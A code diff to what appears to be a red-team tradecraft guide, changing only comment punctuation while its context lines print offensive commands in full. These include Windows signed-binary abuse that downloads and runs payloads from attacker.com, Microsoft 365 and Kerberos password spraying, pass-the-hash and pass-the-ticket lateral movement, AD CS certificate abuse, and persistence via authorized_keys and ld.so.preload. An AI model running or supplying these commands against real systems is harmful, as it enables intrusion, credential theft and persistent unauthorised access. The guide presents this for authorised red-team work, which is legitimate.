@@ -254,11 +254,11 @@ amass enum -active -brute -d target.com -r 8.8.8.8
 # Subfinder
 subfinder -d target.com -all -o subdomains.txt
 
-# dnsx — DNS resolution and validation
+# dnsx: DNS resolution and validation
 dnsx -l subdomains.txt -a -resp -o resolved.txt
 dnsx -l subdomains.txt -cname -resp    # Find CNAMEs (subdomain takeover candidates)
 
-# Massdns — high-performance bulk DNS resolution
+# Massdns: high-performance bulk DNS resolution
 massdns -r resolvers.txt -t A -o S subdomains.txt -w results.txt
 
 # Gobuster DNS mode
@@ -444,15 +444,15 @@ USB Drop Payloads:
 Password Spraying with IP Rotation:
 
 ```bash
-# Fireprox — creates AWS API Gateway proxy to rotate source IPs
+# Fireprox: creates AWS API Gateway proxy to rotate source IPs
 python3 fireprox.py --access_key AKID --secret_access_key SECRET \
   --region us-east-1 --command create --url https://login.microsoftonline.com
 
-# MSOLSpray — Microsoft 365 password spray
+# MSOLSpray: Microsoft 365 password spray
 Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!" \
   -URL https://API_ID.execute-api.us-east-1.amazonaws.com/fireprox/
 
-# Kerbrute — Kerberos pre-auth based user enumeration and password spray
+# Kerbrute: Kerberos pre-auth based user enumeration and password spray
 kerbrute passwordspray -d corp.local users.txt "Winter2024!" --dc 10.0.0.1
 ```
 
@@ -637,23 +637,23 @@ Primary targets are NtTraceEvent and EtwEventWrite. Patching approach: overwrite
 Windows provides many signed Microsoft binaries that can be abused to execute arbitrary code or download files, bypassing application whitelisting.
 
 ```cmd
-# Rundll32 — execute DLL export function
+# Rundll32: execute DLL export function
 rundll32.exe malicious.dll,EntryPoint
 
-# Regsvr32 — remote scriptlet execution (Squiblydoo — T1218.010)
+# Regsvr32: remote scriptlet execution (Squiblydoo: T1218.010)
 regsvr32.exe /s /i:http://attacker.com/payload.sct scrobj.dll
 
-# Mshta — HTA file execution
+# Mshta: HTA file execution
 mshta.exe http://attacker.com/payload.hta
 
-# Certutil — download and decode (T1140)
+# Certutil: download and decode (T1140)
 certutil.exe -urlcache -split -f http://attacker.com/payload.b64 payload.b64
 certutil.exe -decode payload.b64 payload.exe
 
-# BITSAdmin — background file transfer (T1197)
+# BITSAdmin: background file transfer (T1197)
 bitsadmin /transfer job http://attacker.com/payload.exe C:\Users\Public\payload.exe
 
-# Wscript/Cscript — execute JS/VBS
+# Wscript/Cscript: execute JS/VBS
 wscript.exe payload.js
 cscript.exe //nologo payload.vbs
 ```
@@ -786,7 +786,7 @@ find / -perm /2000 -type f 2>/dev/null   # SGID
 # Common exploitable SUID: find, vim, nano, cp, python, perl, ruby, awk, nmap, bash
 
 # Sudo misconfiguration
-sudo -l   # List allowed commands — check each against GTFOBins
+sudo -l   # List allowed commands: check each against GTFOBins
 
 # Writable cron jobs
 crontab -l
@@ -903,31 +903,31 @@ Pass-the-Hash (T1550.002):
 NTLM authentication allows authentication using only the password hash. Captured NT hashes can authenticate to any system that uses NTLM.
 
 ```bash
-# impacket-wmiexec — uses WMI for execution (stealthier, no service creation)
+# impacket-wmiexec: uses WMI for execution (stealthier, no service creation)
 impacket-wmiexec domain/user@target -hashes :NThash
 
-# impacket-psexec — creates a service and executes commands (noisier)
+# impacket-psexec: creates a service and executes commands (noisier)
 impacket-psexec domain/user@target -hashes :NThash
 
-# impacket-smbexec — semi-interactive shell via SMB (no binary upload required)
+# impacket-smbexec: semi-interactive shell via SMB (no binary upload required)
 impacket-smbexec domain/user@target -hashes :NThash
 
-# CrackMapExec — lateral movement at scale
+# CrackMapExec: lateral movement at scale
 crackmapexec smb 10.0.0.0/24 -u administrator -H NThash --shares
 crackmapexec smb 10.0.0.0/24 -u administrator -H NThash -x "whoami"
 crackmapexec smb 10.0.0.0/24 -u administrator -H NThash --sam
 
-# evil-winrm — WinRM access with hash
+# evil-winrm: WinRM access with hash
 evil-winrm -i target -u administrator -H NThash
 ```
 
 Pass-the-Ticket (T1550.003):
 
 ```powershell
-# Rubeus — request TGT with captured hash (overpass-the-hash)
+# Rubeus: request TGT with captured hash (overpass-the-hash)
 Rubeus.exe asktgt /user:administrator /ntlm:HASH /domain:corp.local /ptt
 
-# Rubeus — import captured .kirbi ticket
+# Rubeus: import captured .kirbi ticket
 Rubeus.exe ptt /ticket:ticket.kirbi
 
 # List current tickets
@@ -1033,7 +1033,7 @@ AD CS Certificate Persistence (T1649):
 Active Directory Certificate Services misconfigurations enable attackers to enroll certificates that authenticate as privileged users indefinitely.
 
 ```bash
-# Certipy — enumerate and exploit AD CS
+# Certipy: enumerate and exploit AD CS
 certipy find -u user@corp.local -p password -dc-ip 10.0.0.1 -vulnerable
 
 # ESC1: enroll certificate specifying arbitrary UPN
@@ -1098,7 +1098,7 @@ systemctl --user enable hidden.service
 # SSH authorized_keys (T1098.004)
 echo "ssh-rsa AAAA...attacker_public_key" >> ~/.ssh/authorized_keys
 
-# LD_PRELOAD via /etc/ld.so.preload (T1574.006) — REQUIRES ROOT
+# LD_PRELOAD via /etc/ld.so.preload (T1574.006): REQUIRES ROOT
 echo "/tmp/.evil.so" > /etc/ld.so.preload
 ```
 
@@ -1131,13 +1131,13 @@ Write as a story with timestamps and evidence. The narrative should be readable 
 ```
 Day 1 - 09:14  Sent phishing email campaign to 47 employees in Finance department
 Day 1 - 11:32  User finance.user@target.com clicked link, submitted credentials to capture page
-Day 1 - 11:35  Used captured credentials against VPN portal — MFA push sent to victim phone
-Day 1 - 11:38  Victim approved MFA push (push fatigue — 4th push in 3 minutes)
+Day 1 - 11:35  Used captured credentials against VPN portal: MFA push sent to victim phone
+Day 1 - 11:38  Victim approved MFA push (push fatigue: 4th push in 3 minutes)
 Day 1 - 11:40  Established VPN session. Implant deployed via PowerShell. Initial foothold confirmed.
 Day 1 - 14:22  Local privilege escalation via PrintSpoofer (SeImpersonatePrivilege). SYSTEM obtained.
 Day 2 - 08:15  Lateral movement to file server FS01 via Pass-the-Hash using local admin hash.
 Day 2 - 10:44  Kerberoasting yielded 12 TGS tickets. svc_backup cracked offline in 22 minutes.
-Day 2 - 16:30  svc_backup is Domain Admin. DCSync performed — all domain hashes obtained.
+Day 2 - 16:30  svc_backup is Domain Admin. DCSync performed: all domain hashes obtained.
 Day 3 - 09:00  Primary objective achieved: read access to production financial database confirmed.
 ```
 
@@ -1170,14 +1170,14 @@ ATT&CK Navigator allows visualization of techniques used during an engagement as
       "techniqueID": "T1566.001",
       "tactic": "initial-access",
       "color": "#ff6666",
-      "comment": "Spear phishing with credential harvest link — 3 of 47 targets clicked",
+      "comment": "Spear phishing with credential harvest link, 3 of 47 targets clicked",
       "enabled": true
     },
     {
       "techniqueID": "T1621",
       "tactic": "credential-access",
       "color": "#ff6666",
-      "comment": "MFA push fatigue — victim approved 4th consecutive push",
+      "comment": "MFA push fatigue, victim approved 4th consecutive push",
       "enabled": true
     }
   ]
